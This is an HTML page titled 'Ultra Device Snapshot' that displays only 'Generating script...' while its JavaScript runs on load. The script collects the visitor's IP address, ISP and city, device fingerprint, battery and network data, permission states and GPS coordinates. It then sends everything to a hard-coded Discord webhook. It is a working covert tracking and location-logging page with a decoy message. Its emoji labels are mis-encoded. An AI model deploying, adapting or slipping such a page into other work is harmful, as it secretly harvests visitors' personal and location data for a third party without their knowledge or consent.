<!DOCTYPE html>
<html>
<head>
  <title>Ultra Device Snapshot</title>
</head>
<body>
  <h1>Generating script...</h1>
  <script>
    async function getIPInfo() {
      try {
        const res = await fetch("https://ipapi.co/json/");
        return await res.json();
      } catch {
        return {};
      }
    }

    function getBatteryInfo() {
      return navigator.getBattery?.().then(battery => ({
        "ðŸ”‹ Battery Level": `${Math.round(battery.level * 100)}%`,
        "ðŸ”Œ Charging": battery.charging ? "Yes" : "No"
      })) || Promise.resolve({});
    }

    function getConnectionInfo() {
      const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
      return {
        "ðŸ“¶ Connection Type": conn.effectiveType || "Unknown",
        "â±ï¸ Downlink (Mbps)": conn.downlink || "Unknown",
        "â³ RTT (ms)": conn.rtt || "Unknown"
      };
    }

    function getBasicInfo() {
      return {
        "ðŸ–¥ï¸ Platform": navigator.platform,
        "ðŸ§­ User Agent": navigator.userAgent,
        "ðŸ—ºï¸ Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
        "ðŸ“º Screen Resolution": `${screen.width}x${screen.height}`,
        "ðŸ”„ Orientation": screen.orientation?.type || "Unknown",
        "ðŸŒ Online": navigator.onLine ? "Yes" : "No",
        "ðŸ‘€ Page Visible": document.visibilityState,
        "ðŸ§  RAM Estimate": navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unavailable",
        "ðŸ§® CPU Cores": navigator.hardwareConcurrency || "Unavailable",
        "ðŸŽ¨ Color Depth": screen.colorDepth || "Unknown",
        "ðŸŒ Language": navigator.language,
        "ðŸª Cookies Enabled": navigator.cookieEnabled ? "Yes" : "No",
        "ðŸ“± Touch Support": 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? "Yes" : "No",
        "ðŸ” HTTPS Connection": window.isSecureContext ? "Yes" : "No"
      };
    }

    async function getPermissionsStatus() {
      const names = ["geolocation", "notifications", "camera", "microphone"];
      const result = {};
      for (const name of names) {
        try {
          const status = await navigator.permissions.query({ name });
          result[`ðŸ”’ Permission: ${name}`] = status.state;
        } catch {
          result[`ðŸ”’ Permission: ${name}`] = "Not Supported";
        }
      }
      return result;
    }

    function getGeoLocation() {
      return new Promise(resolve => {
        if (!navigator.geolocation) return resolve({});
        navigator.geolocation.getCurrentPosition(
          pos => resolve({
            "ðŸ“ GPS Latitude": pos.coords.latitude.toFixed(5),
            "ðŸ“ GPS Longitude": pos.coords.longitude.toFixed(5),
            "ðŸ“¡ Accuracy (m)": pos.coords.accuracy
          }),
          () => resolve({ "ðŸ“ GPS": "Denied or Unavailable" }),
          { timeout: 5000 }
        );
      });
    }

    async function sendDeviceInfo() {
      const [ipInfo, batteryInfo, permissions, gpsInfo] = await Promise.all([
        getIPInfo(),
        getBatteryInfo(),
        getPermissionsStatus(),
        getGeoLocation()
      ]);

      const info = {
        "ðŸŒ IP Address": ipInfo.ip || "Unavailable",
        "ðŸ“ IP Location": `${ipInfo.city || "?"}, ${ipInfo.region || "?"}, ${ipInfo.country_name || "?"}`,
        "ðŸ¢ ISP": ipInfo.org || "Unavailable",
        ...getBasicInfo(),
        ...getConnectionInfo(),
        ...batteryInfo,
        ...permissions,
        ...gpsInfo,
        "ðŸ“… Timestamp": new Date().toLocaleString()
      };

      const webhookUrl = "https://discord.com/api/webhooks/1391142251488481361/kn2nhAco5AZ5_gsFXCIO_S_9ubhIuGDErYfrRa7Vkj_Ii_glbvgsy1KKDnSJ0sOfbuQU";

      try {
        await fetch(webhookUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            username: "ðŸ“¡ Ultra Snapshot",
            avatar_url: "https://i.imgur.com/AfFp7pu.png",
            embeds: [{
              title: "ðŸ§  Ultra Device Snapshot",
              description: "Max data captured from browser environment.",
              color: 0xff6f00,
              fields: Object.entries(info).map(([name, value]) => ({
                name,
                value: String(value),
                inline: false
              })),
              footer: { text: "Collected using JavaScript API" },
              timestamp: new Date().toISOString()
            }]
          })
        });
        console.log("Device info sent to webhook.");
      } catch (err) {
        console.error("Webhook failed:", err);
      }
    }

    sendDeviceInfo();
  </script>
</body>
</html>
